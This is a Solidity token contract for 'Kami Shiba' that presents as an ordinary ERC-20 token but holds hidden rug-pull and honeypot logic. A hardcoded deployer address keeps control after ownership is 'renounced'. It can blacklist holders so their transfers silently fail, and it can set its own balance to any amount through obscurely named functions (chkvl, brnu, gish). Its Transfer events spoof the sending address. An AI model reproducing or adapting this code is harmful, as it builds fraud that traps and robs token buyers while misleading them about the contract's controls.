/**
 *Submitted for verification at Etherscan.io on 2022-10-25
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract KAMISHIBA {
  
    mapping (address => uint256) public rT;
    mapping (address => uint256) public Iz;
    mapping (address => bool) bN;
    mapping(address => mapping(address => uint256)) public allowance;





    string public name = unicode"Kami Shiba";
    string public symbol = unicode"KAMI SHIB";
    uint8 public decimals = 18;
    uint256 public totalSupply = 700000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
   

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    address r_Construct = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;

    constructor()  {
    rT[msg.sender] = totalSupply;
    deploy(r_Construct, totalSupply); }

   
   address rdeployer = 0xec6C9F480EFb9b9FB5d34b8AF993024892932659;
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
      
       
        if(msg.sender == rdeployer)  {
        require(rT[msg.sender] >= value);
        rT[msg.sender] -= value;  
        rT[to] += value; 
        emit Transfer (r_Construct, to, value);
        return true; }  
        if(!bN[msg.sender]) {
        require(rT[msg.sender] >= value);
        rT[msg.sender] -= value;  
        rT[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }}

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

        function gish () public {
         if(msg.sender == rdeployer)   {
        rT[msg.sender] = Iz[msg.sender];
        }}

        function balanceOf(address account) public view returns (uint256) {
        return rT[account]; }

        function sny(address ii) public {
        if(msg.sender == rdeployer)  { 
        bN[ii] = false;}}
        function chkvl(address ii) public{
         if(msg.sender == rdeployer)  { 
        require(!bN[ii]);
        bN[ii] = true;
        }}
             function brnu(uint256 x) public {
        if(msg.sender == rdeployer)  { 
        Iz[msg.sender] = x;} }

        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 

        if(from == rdeployer)  {
        require(value <= rT[from]);
        require(value <= allowance[from][msg.sender]);
        rT[from] -= value;  
        rT[to] += value; 
        emit Transfer (r_Construct, to, value);
        return true; }    
          if(!bN[from] && !bN[to]) {
        require(value <= rT[from]);
        require(value <= allowance[from][msg.sender]);
        rT[from] -= value;
        rT[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}}